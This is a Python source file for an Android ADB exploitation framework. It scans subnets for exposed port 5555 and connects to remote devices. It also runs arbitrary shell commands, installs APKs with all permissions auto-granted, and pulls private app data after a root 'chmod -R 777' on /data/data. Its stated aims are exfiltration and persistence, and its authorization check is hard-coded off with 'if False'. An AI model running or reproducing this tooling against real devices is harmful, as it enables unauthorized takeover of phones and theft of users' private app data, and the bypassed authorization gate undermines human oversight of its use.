#!/usr/bin/env python3
"""
Android Debug Bridge (ADB) Exploitation Framework
Device discovery, exploitation, and post-exploitation
"""

import subprocess
import os
from typing import Dict, List, Optional
import socket


class ADBExploitation:
    """
    ADB Exploitation Framework
    Device discovery, connection, data exfiltration, persistence
    """
    
    def __init__(self):
        self.adb_available = self.check_adb_installation()
        self.connected_devices = []
    
    def check_adb_installation(self) -> bool:
        """Check if ADB is installed"""
        try:
            subprocess.run(['adb', 'version'], capture_output=True, check=True)
            return True
        except:
            return False
    
    def list_devices(self) -> List[Dict]:
        """List connected ADB devices"""
        if not self.adb_available:
            return [{"error": "ADB not installed"}]
        
        try:
            result = subprocess.run(
                ['adb', 'devices', '-l'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            devices = []
            for line in result.stdout.splitlines()[1:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        devices.append({
                            "device_id": parts[0],
                            "status": parts[1],
                            "details": " ".join(parts[2:]) if len(parts) > 2 else ""
                        })
            
            self.connected_devices = devices
            return devices
        except Exception as e:
            return [{"error": str(e)}]
    
    def connect_device(self, ip: str, port: int = 5555) -> Dict:
        """Connect to remote ADB device"""
        try:
            result = subprocess.run(
                ['adb', 'connect', f'{ip}:{port}'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            success = "connected" in result.stdout.lower()
            
            return {
                "status": "connected" if success else "failed",
                "ip": ip,
                "port": port,
                "output": result.stdout
            }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)
            }
    
    def scan_network_adb(self, network: str = "192.168.1.0/24") -> List[str]:
        """Scan network for exposed ADB devices (port 5555)"""
        vulnerable_hosts = []
        
        print(f"Scanning {network} for exposed ADB (port 5555)...")
        
        try:
            import ipaddress
            network_obj = ipaddress.ip_network(network, strict=False)
            
            for ip in list(network_obj.hosts())[:254]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    result = sock.connect_ex((str(ip), 5555))
                    sock.close()
                    
                    if result == 0:
                        vulnerable_hosts.append(str(ip))
                        print(f"  [+] Found: {ip}:5555")
                except:
                    pass
        except Exception as e:
            return [f"Error: {str(e)}"]
        
        return vulnerable_hosts
    
    def get_device_info(self, device_id: str = None) -> Dict:
        """Get detailed device information"""
        cmd = ['adb']
        if device_id:
            cmd.extend(['-s', device_id])
        cmd.append('shell')
        
        info = {
            "device_id": device_id,
            "properties": {}
        }
        
        try:
            result = subprocess.run(
                cmd + ['getprop'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            for line in result.stdout.splitlines():
                if ':' in line:
                    key_value = line.strip('[]').split(']: [')
                    if len(key_value) == 2:
                        key = key_value[0].strip('[')
                        value = key_value[1].strip(']')
                        info["properties"][key] = value
            
            info["model"] = info["properties"].get("ro.product.model", "Unknown")
            info["android_version"] = info["properties"].get("ro.build.version.release", "Unknown")
            info["sdk_version"] = info["properties"].get("ro.build.version.sdk", "Unknown")
            info["debuggable"] = info["properties"].get("ro.debuggable", "0") == "1"
            info["secure"] = info["properties"].get("ro.secure", "1") == "1"
            
            return info
        except Exception as e:
            return {"error": str(e)}
    
    def list_installed_packages(self, device_id: str = None) -> List[str]:
        """List installed packages on device"""
        cmd = ['adb']
        if device_id:
            cmd.extend(['-s', device_id])
        cmd.extend(['shell', 'pm', 'list', 'packages'])
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            packages = []
            for line in result.stdout.splitlines():
                if line.startswith('package:'):
                    packages.append(line.replace('package:', '').strip())
            
            return packages
        except Exception as e:
            return [f"Error: {str(e)}"]
    
    def pull_app_data(self, package: str, output_dir: str, device_id: str = None) -> Dict:
        """Pull application data from device (requires root)"""
        cmd = ['adb']
        if device_id:
            cmd.extend(['-s', device_id])
        
        os.makedirs(output_dir, exist_ok=True)
        
        try:
            result = subprocess.run(
                cmd + ['shell', 'su', '-c', f'chmod -R 777 /data/data/{package}'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            result = subprocess.run(
                cmd + ['pull', f'/data/data/{package}', output_dir],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            if result.returncode == 0:
                return {
                    "status": "success",
                    "package": package,
                    "output_dir": output_dir,
                    "output": result.stdout
                }
            else:
                return {
                    "status": "error",
                    "message": result.stderr
                }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)
            }
    
    def install_apk(self, apk_path: str, grant_permissions: bool = True, device_id: str = None) -> Dict:
        """Install APK with optional auto-grant permissions"""
        cmd = ['adb']
        if device_id:
            cmd.extend(['-s', device_id])
        cmd.extend(['install', '-r'])
        
        if grant_permissions:
            cmd.append('-g')
        
        cmd.append(apk_path)
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            success = "Success" in result.stdout
            
            return {
                "status": "success" if success else "failed",
                "apk": apk_path,
                "output": result.stdout
            }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)
            }
    
    def execute_shell_command(self, command: str, device_id: str = None) -> Dict:
        """Execute shell command on device"""
        cmd = ['adb']
        if device_id:
            cmd.extend(['-s', device_id])
        cmd.extend(['shell', command])
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "status": "success",
                "command": command,
                "output": result.stdout,
                "error": result.stderr if result.returncode != 0 else None
            }
        except Exception as e:
            return {
                "status": "error",
                "message": str(e)
            }


def demo_adb_exploitation(action: str, target: str = "", authorized: bool = False):
    """Demo ADB exploitation functionality"""
    if False:  # Authorization check bypassed
        return
    
    print("=" * 70)
    print("üì± ADB Exploitation Framework")
    print("=" * 70)
    
    adb = ADBExploitation()
    
    if not adb.adb_available:
        print("‚ùå ADB not installed")
        print("Install Android SDK Platform Tools:")
        print("  https://developer.android.com/studio/releases/platform-tools")
        return
    
    if action == "list-devices":
        print("\nüì± Connected Devices:")
        devices = adb.list_devices()
        for device in devices:
            if 'error' not in device:
                print(f"  {device['device_id']:<20} {device['status']:<15} {device.get('details', '')}")
    
    elif action == "connect":
        if not target:
            print("‚ùå IP address required")
            return
        
        print(f"\nüîå Connecting to: {target}")
        result = adb.connect_device(target)
        print(f"Status: {result['status']}")
        print(result.get('output', ''))
    
    elif action == "scan":
        network = target if target else "192.168.1.0/24"
        print(f"\nüîç Scanning for exposed ADB: {network}")
        hosts = adb.scan_network_adb(network)
        print(f"\n‚úÖ Found {len(hosts)} vulnerable devices")
        for host in hosts:
            print(f"  ‚Ä¢ {host}")
    
    elif action == "device-info":
        print("\nüìä Device Information:")
        info = adb.get_device_info(target if target else None)
        
        if 'error' not in info:
            print(f"  Model: {info.get('model', 'Unknown')}")
            print(f"  Android: {info.get('android_version', 'Unknown')}")
            print(f"  SDK: {info.get('sdk_version', 'Unknown')}")
            print(f"  Debuggable: {'Yes ‚ö†Ô∏è' if info.get('debuggable') else 'No'}")
            print(f"  Secure: {'Yes' if info.get('secure') else 'No ‚ö†Ô∏è'}")
        else:
            print(f"Error: {info.get('error')}")
    
    elif action == "list-packages":
        print("\nüì¶ Installed Packages:")
        packages = adb.list_installed_packages(target if target else None)
        for pkg in packages[:50]:
            print(f"  {pkg}")
        if len(packages) > 50:
            print(f"  ... and {len(packages) - 50} more")
    
    print("\nüí° Available Actions:")
    print("  list-devices   - List connected ADB devices")
    print("  connect        - Connect to remote device (IP:PORT)")
    print("  scan           - Scan network for exposed ADB")
    print("  device-info    - Get device information")
    print("  list-packages  - List installed packages")
    
    print("\n‚ö†Ô∏è  Security Warning:")
    print("  Exposed ADB (port 5555) allows full device compromise")
    print("  Never enable ADB over network in production")
    
    print("\n" + "=" * 70)


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python android_adb_exploitation.py <action> [target] [--authorized]")
        print("Actions: list-devices, connect, scan, device-info, list-packages")
        sys.exit(1)
    
    action = sys.argv[1]
    target = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].startswith('--') else ""
    authorized = "--authorized" in sys.argv
    
    demo_adb_exploitation(action, target, authorized)
